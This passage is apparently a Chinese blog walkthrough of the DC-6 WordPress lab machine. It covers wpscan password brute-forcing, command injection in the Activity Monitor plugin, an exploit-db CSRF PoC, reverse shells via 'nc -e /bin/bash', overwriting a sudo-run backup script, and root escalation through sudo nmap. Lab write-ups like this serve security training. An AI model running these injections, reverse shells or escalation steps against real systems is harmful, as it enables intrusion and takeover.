src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481976589.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721481920404.png" alt="img"></p><p>虽然其中获得了很多链接，但我们仔细观察，不难发现，IP地址的下级目录分布均在以下三个文件目录之中：</p><blockquote><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p></blockquote><h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p>综合三种爆破方式得到的目录列表，得到目录列表：</p><blockquote><p><a href="http://192.168.204.135/wp-content/">http://192.168.204.135/wp-content/</a></p><p><a href="http://192.168.204.135/wp-includes/">http://192.168.204.135/wp-includes/</a></p><p><a href="http://192.168.204.135/wp-admin/">http://192.168.204.135/wp-admin/</a></p><p><a href="http://wordy/wp-login.php?redirect_to=http://192.168.204.135/wp-admin/&reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.204.135%2Fwp-admin%2F&amp;reauth=1</a></p><p><a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p><p><a href="http://192.168.204.135/index.php">http://192.168.204.135/index.php</a></p><p><a href="http://192.168.204.135/license.txt">http://192.168.204.135/license.txt</a></p><p><a href="http://192.168.204.135/readme.html">http://192.168.204.135/readme.html</a></p><p><a href="http://192.168.204.135/wp-admin/install.php">http://192.168.204.135/wp-admin/install.php</a></p><p><a href="http://192.168.204.135/wp-config.php">http://192.168.204.135/wp-config.php</a></p><p><a href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p><p><a href="http://192.168.204.135/wp-cron.php">http://192.168.204.135/wp-cron.php</a></p></blockquote><p>尝试逐个登陆，其中有一些网页的响应内容是空的，有些不是。如下面的登陆界面。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626449346.png" alt="img"></p><h2 id="用户账户爆破"><a href="#用户账户爆破" class="headerlink" title="用户账户爆破"></a>用户账户爆破</h2><p>上面由nmap漏扫得到的可显示的用户名列表为：</p><blockquote><p>admin</p><p>graham</p><p>mark</p><p>sarah</p><p>jens</p></blockquote><p>因为nmap漏扫的得到的提示信息显示，这些用户名并不完全是所有用户，由于权限限制，所以只显现了这么多。</p><p>已知目标靶机使用的是CMS框架WordPress，针对WordPress，有一款对应的黑盒子扫描工具<code>wpscan</code>，可用于爆破用户名以及用户密码。</p><p>尝试使用wpscan爆破用户名，看看是否能够在已有用户名的基础上再多获得几个用户名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -e u<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616222974.png" alt="img"></p><p>好吧，爆破出来的结果并没有获得其它更多的用户名。因此可以先将目前已经拥有的用户名写入一个用户名字典中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616704302.png" alt="img"></p><p>用户名字典有了，还需要有个密码字典就可以尝试用户爆破了。</p><p>回顾之前做的有关wordpress框架的密码字典获取，它是根据已有的flag提示使用cewl进行密码字典生成的。</p><p>我们也尝试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cewl http://wordy/ -w CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721616973120.png" alt="img"></p><p>ok！，尝试使用现在拥有的用户名和密码字典进行用户爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P CewlDictDC5v1.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721617167389.png" alt="img"></p><p>根据提示，所用的密码字典中的例子都无法成功爆破。所以cewl生成的密码字典无效。需要重新寻找爆破字典。</p><p>惹，不推荐使用kali自带的那个爆破字典<code> /usr/share/wordlists/rockyou.txt</code>爆破速度慢得要命。（估计是因为字典太大了？）</p><p>去下载官网vulnhub看看有没有什么提示：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624077372.png" alt="img"></p><p>ok！开发者们真善良，我们只是想找一份工作而已哈哈哈哈哈。以下是他给我们得操作提示。</p><blockquote><p>cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt</p><p>这段指令的意思是，获取kali默认密码字典的内容并筛选其中包含字符串“k01”的密码，将筛选的结果输出保存到文件passwords.txt中</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwordsdc5.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624369380.png" alt="img"></p><p>操作成功，接下来就是要执行用户账户爆破了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U usersDC5.txt -P passwordsdc5.txt<br></code></pre></td></tr></table></figure><p>ok！成功爆破出一个用户账户。</p><blockquote><p> Username: mark</p><p> Password: helpdesk01</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721624638803.png" alt="img"></p><h2 id="用户登陆-信息获取"><a href="#用户登陆-信息获取" class="headerlink" title="用户登陆&amp;信息获取"></a>用户登陆&amp;信息获取</h2><p>之前我们在进行目录爆破的时候，逐一访问爆破出来的网页的时候，有如下登陆界面，尝试使用上面爆破得到的账户进行登陆。（注意，需要到kali里面操作哦！因为重定向纠正是在kali里面的）</p><p><a href="http://192.168.204.135/wp-login.php">http://192.168.204.135/wp-login.php</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626484402.png" alt="img"></p><p>ok，前面虽然有cookie报错，但是尝试了两边之后，就登陆成功了。而且惊喜的是，登陆成功的是admin管理员后台系统。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626563699.png" alt="img"></p><p>在模块<code>Users</code>获取了员工信息：用户名、姓名、邮箱、工作角色。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721626854866.png" alt="img"></p><p>还发现了一个<code>Activity monitor</code>模块，活动管理模块（活动监视器），功能类似于日志，监控系统资源的使用：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627244039.png" alt="img"></p><p>在<code>wordpress</code>框架中，使用到<code>Activity monitor</code>工具可以理解为“插件”。关于该插件的漏洞利用，是存在的哦！</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>使用<code>searchsploit</code>查找可利用的代码文件。（需要将wordpress和Activity monitor这两个关键词都包含哦！）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit WordPress Activity monitor<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721627774276.png" alt="img"></p><p>得到了两条查询结果：</p><blockquote><p>php&#x2F;webapps&#x2F;45274.html</p><p>php&#x2F;webapps&#x2F;50110.py</p></blockquote><p>可以先下载保存一下，看看是什么内容的文件，又或者先使用<code>-P</code>选项查看其详细信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 45274.html<br>searchsploit -p 50110.py<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721628066665.png" alt="img"></p><ul><li><strong>先cat查看45274.html文件</strong></li></ul><h3 id="POC反弹shell（傻呗）"><a href="#POC反弹shell（傻呗）" class="headerlink" title="POC反弹shell（傻呗）"></a>POC反弹shell（傻呗）</h3><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721629740248.png" alt="img"></p><p>给出了POC执行代码和提示：</p><blockquote><p>Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell</p><p>PoC：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;html&gt;<br>&lt;body&gt;<br>&lt;script&gt;history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)&lt;/script&gt;<br> &lt;form action=<span class="hljs-string">&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;ip&quot;</span> value=<span class="hljs-string">&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;lookup&quot;</span> value=<span class="hljs-string">&quot;Lookup&quot;</span> /&gt;<br>   &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;<br> &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></blockquote><p>仔细查看POC的内容，发现其来源“action”是”<a href="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools%22%E8%BF%99%E4%B8%AA%E7%BD%91%E9%A1%B5%E3%80%82%E5%BE%88%E7%86%9F%E6%82%89%EF%BC%81%E8%B7%9F%E5%A6%82%E4%B8%8B%60Activity">http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot;这个网页。很熟悉！跟如下`Activity</a> monitor<code>网页的链接后半部分都一样，而且这里的</code>localhost:8000&#96;应该也是指本地主机和监听端口了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721632560322.png" alt="img"></p><p>抓包，抓取Referer与上述action值对应的数据包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633174618.png" alt="img"></p><p>先发送至重放器，然后右键点击如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240722161127082.png" alt="image-20240722161127082"></p><p>将其中的poc内容替换为文件内容。执行“用浏览器测试”。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633497290.png"></p><p><a href="http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij">http://burpsuite/show/6/rx0vjlu75w9ngnsxmajrpopwwkbt0wij</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633567708.png" alt="img"></p><p>提交请求”Submit request”，即提交表单。并在这过程中进行抓包。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633609315.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633630059.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633654428.png" alt="img"></p><p>很遗憾，最后好像只是将反弹shell的命令注入到如上的输入框中，后台并没有实际执行这个命令。因为还是没有成功反弹。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721633768955.png" alt="img"></p><p>按道理来说，提交表单之后应该就可以监听到反弹shell了，至于这里为什么失败了，看看是否是反弹时长比较长？之后再进行尝试吧。</p><ul><li><strong>查看50110.py文件</strong></li></ul><h3 id="漏洞脚本（-py）Getshell"><a href="#漏洞脚本（-py）Getshell" class="headerlink" title="漏洞脚本（.py）Getshell"></a>漏洞脚本（.py）Getshell</h3><p>这应该是个脚本文件，先看看它的具体代码内容吧。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721636490651.png" alt="img"></p><p>直接就有使用方法了！直接使用python3命令执行漏洞利用脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 /usr/share/exploitdb/exploits/php/webapps/50110.py<br></code></pre></td></tr></table></figure><p>输入目标靶机的IP地址、已获得用户名、用户密码。</p><p> 码垛！直接成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637189750.png" alt="img"></p><p>接下来，可以先查找一下有没有flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637413521.png" alt="img"></p><p>查出来的结果挺少。也没有我们要找的flag文本文件。</p><p>所以，我们只好考虑提权了！</p><p>有关于Getshell的方法，还有一个利用网页组件漏洞的！</p><h3 id="网页组件漏洞Getshell"><a href="#网页组件漏洞Getshell" class="headerlink" title="网页组件漏洞Getshell"></a>网页组件漏洞Getshell</h3><p>首先，我们在进行网页检索的时候，在<code>Activity monitor</code>发现了一个可能的注入点<code>IP or integer *</code>。然后下方还有两个按钮控件，看着像是提交<code>IP or integer *</code>的按钮。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721637749847.png" alt="img"></p><p>根据提示信息：</p><p><code>Convert</code>按钮将会把IP地址或整型数据转化成与之等价的整型数据或IP地址。</p><p><code>Lookup</code>按钮会尝试去解决将一个IP地址转换为主机名字的问题。后面还说，如果dig在web服务器上安装了，那也可以被用作<code>搜索</code></p><p>然后我们可以尝试抓包，看看是什么效果：</p><ul><li><code>Convert</code>按钮</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639725380.png" alt="img"></p><ul><li><code>Lookup</code>按钮</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721639777147.png" alt="img"></p><p>两个按钮控件抓取的数据包好像没什么差别。也可能是因为输入的测试数据简单且不是命令。</p><p>从上面提示入手，<code>Lookup</code>按钮提示有：如果dig在web服务器上安装了，那也可以被用作<code>搜索</code>。那么我们就尝试输入与搜索相关的指令。</p><p>执行<code>ls</code>命令，抓包：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640027157.png" alt="img"></p><p>好像也没啥特别的。数据包内没有出现目录列表，网站中也没有出现目录列表。</p><p>输入域名，好像也没啥特别之处：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640165117.png" alt="img"></p><p>尝试使用并列执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">baidu.com|<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>完全放行完请求数据包后，发现在目标网站上出现了响应数据：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640264134.png" alt="img"></p><p>可以发现的是，这里执行了并行符号后面的<code>ls</code>指令。难道是需要有<code>|</code>符号在目标指令的前面才行？</p><p>尝试<code>|ls</code>，发现这样又不行了。</p><p>猜测不仅需要有<code>|</code>，还需要更多。</p><p>尝试<code>.com|ls</code>，发现这样又成功了！</p><p>尝试<code>.|ls</code> ，发现成功了！</p><p>这样以来，想要执行指令的最简便方式就是<code>.| + 目标指令</code></p><p>那就直接执行反弹shell的指令呗！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 192.168.204.128 9999<br>.|nc -e /bin/bash 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p>发现有前端输入长度限制：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640859469.png" alt="img"></p><p>那我们就尝试修改数据包吧！修改完成后重放！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721640983822.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641019990.png" alt="img"></p><p>ok！成功获得反弹shell。</p><p>切换交互界面：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641094356.png" alt="img"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="命令提权"><a href="#命令提权" class="headerlink" title="命令提权"></a>命令提权</h3><p>首先查看具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641213920.png" alt="img"></p><p>其中可以进行提权的有：<code>passwd</code>、<code>su</code>、<code>mount</code>、<code>umount</code>。但按照以往的经验，这些指令一般都无法成功提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641376061.png" alt="img"></p><p>也没有获得什么有用的提示。</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>无法根据已有命令进行提权后，我们就需要去重新搜集一些有用的信息了。</p><p>使用<code>ls</code>命令查看目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721641640491.png" alt="img"></p><p>这也太多了吧。。。。而且它们大多都是php代码文件。</p><p>尝试切换用户，之前我们在浏览网站的时候收到了团队核心人物介绍，说 jens 是他们开发团队的重要人物，那我们就先切换到 jens用户吧。</p><p>使用<code>su</code>命令，但是！需要有对应用户的密码呀！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647126070.png" alt="img"></p><p>所以还是得从mark账户下的文件查找有关信息。</p><p>mark目录下还是有几个文件的：</p><blockquote><p>js 、maint 、css、images、network、user、includes </p></blockquote><p>只能逐一进行访问咯。其中：<br>· js 文件主要包含用于前端开发的 js 代码文件。js文件夹里面也全都是 js 代码文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647469829.png" alt="img"></p><p>· maint 文件夹下只包含了一个修复php文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647491273.png" alt="img"></p><p>· css文件夹下主要包含的是构成网页外观和样式的代码文件。其下也基本都是css代码文件，虽然有一个”colors“文件夹，但是看名字就知道应该跟我们想要的信息无关。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647651932.png"></p><p>· images文件夹同css理，其下全都是图像文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647783119.png" alt="img"></p><p>· network文件夹，其下也全都是些php代码文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647828646.png" alt="img"></p><p>· user文件夹，听名字感觉可能会找到有用信息，查看其目录列表。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721647924638.png" alt="img"></p><blockquote><p>about.php  credits.php   index.php  privacy.php  user-edit.php<br>admin.php  freedoms.php  menu.php   profile.php</p></blockquote><p>逐一访问了上述php文件，均没找到有用的可以利用的信息。</p><p>· includes 文件夹，看了一下，也全都是php文件，浅判断为没啥有用的信息。</p><p>如上，可以得知，在mark用户的<code>/var/www/html/wp-admin</code>目录下，没有什么有价值的信息。返回根目录进行查看。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648522524.png" alt="img"></p><p>发现其中有<code>home</code>目录，home目录通常为用户主目录，也许会记录有用户的相关信息，比如密码之类的。</p><p>进去看！！！！！！！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648640692.png" alt="img"></p><p>果然，分别对应有四个用户的用户文件。</p><p>分别进去查看呗。</p><ul><li>graham</li></ul><p>什么都没有。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648731950.png" alt="img"></p><ul><li>jens</li></ul><p>只有一个不知道用于备份什么的备份脚本文件<code>backups.sh</code>（backup：程序或文件的备份，拷贝）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648770504.png" alt="img"></p><p>查看该脚本文件的内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721648879649.png" alt="img"></p><p>好，没啥有用的信息。</p><ul><li>mark</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649004211.png" alt="img"></p><p>好了，终于可以触发连招了，”stuff：某个物质、材料、一组物品“，其下还有一个<code>things-to-do.txt</code>文件，看着像是待办。</p><p>cat一下呗：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649141874.png" alt="img"></p><p>有一个添加新用户,而且已经完成，在其中发现了<code>graham</code>的账户。</p><blockquote><p>user：graham</p><p>password：GSo7isUM1D4</p></blockquote><ul><li>sarah</li></ul><p>什么有没有呀</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649261175.png" alt="img"></p><h3 id="切换graham用户"><a href="#切换graham用户" class="headerlink" title="切换graham用户"></a>切换graham用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su graham<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649353583.png" alt="img"></p><p>可以发现其下也分别拥有四个用户的文件。</p><p>tomato，继续搜集信息！</p><p>· 还是继续先查看各个用户下的文件吧：</p><blockquote><p>graham : 空，什么文件都没有。（<code>~</code>表示当前账户用户的意思）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651383415.png" alt="img"></p><blockquote><p>jens ：同样只有那个<code>backups.sh</code>备份脚本</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651471925.png" alt="img"></p><blockquote><p>mark：和之前在mark用户所拥有的信息一致</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651540788.png" alt="img"></p><blockquote><p>sarah：空，什么文件都没有</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651582411.png" alt="img"></p><p>· 查看 sudo 配置信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721649480690.png" alt="img"></p><p>有关于jens的提示：jens是无密码用户（NOPASSWD），这意味着我们无法切换到他，这个文件就是在mark的home目录下的jens文件下的备份脚本。</p><blockquote><p> (jens) NOPASSWD: &#x2F;home&#x2F;jens&#x2F;backups.sh</p></blockquote><p>不过这里既然都提示了这个脚本，那就执行看看吧。</p><p>进入到对应目录下执行<code>./backups.sh</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651683654.png" alt="img"></p><p>可以看到，由于权限不足，请求被拒绝了。</p><p>我们是在graham的账户上尝试去执行jens的脚本文件，好像权限不足也能理解。</p><p>所以我们需要使用sudo命令通过 jens 用户的身份去执行这个脚本文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721651934366.png" alt="img"></p><p>命令执行后下面显示的这段提示告诉我们：</p><blockquote><p><code>tar</code>在解压缩过程中自动处理了文件名，移除了开头的<code>/</code>，以保证解压缩到当前目录下的正确路径。</p></blockquote><p>因此，<code>backups.sh</code>中的解压缩命令被成功执行了！</p><p>那我们将其中的命令修改为反弹shell的指令，那它不就乖乖执行了，我们不久获得jens用户的登陆权限了吗！</p><h3 id="切换jens用户"><a href="#切换jens用户" class="headerlink" title="切换jens用户"></a>切换jens用户</h3><p>尝试使用vim进行修改，但发现不存在vim命令，可能是命令限制。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652717673.png" alt="img"></p><p>那我们就是用<code>echo</code>命令进行覆盖式写入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.204.128 6666&quot;</span> &gt; backups.sh<br></code></pre></td></tr></table></figure><p>cat一下查看效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652871391.png" alt="img"></p><p>新开一个终端进行端口监听：<code>nc -lvvp 6666</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721652959342.png" alt="img"></p><p>成功！</p><p>查找flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653106562.png" alt="img"></p><p>由于权限不足被拒绝了捏。</p><p>查看具有SUID权限的命令！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653199105.png" alt="img"></p><p>好像没啥有用的可提权命令，查看sudo配置信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653212105.png" alt="img"></p><p>ok！获知<code>nmap</code>可以用来提权。</p><blockquote><p> (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</p></blockquote><h3 id="nmap提权"><a href="#nmap提权" class="headerlink" title="nmap提权"></a>nmap提权</h3><p><a href="https://blog.csdn.net/a1_pha/article/details/135448072">nmap提权</a></p><p>在jens用户目录下逐一执行以下命令：（命令的详细含义参考上面的链接）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>sudo nmap --script=<span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721653886328.png" alt="img"></p><p>ok！提权成功！</p><p>寻找flag文件！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721654002112.png" alt="img"></p><p>ok！至此，全部操作结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>namp提权方法：</li></ul><blockquote><p>TF&#x3D;$(mktemp)<br>echo 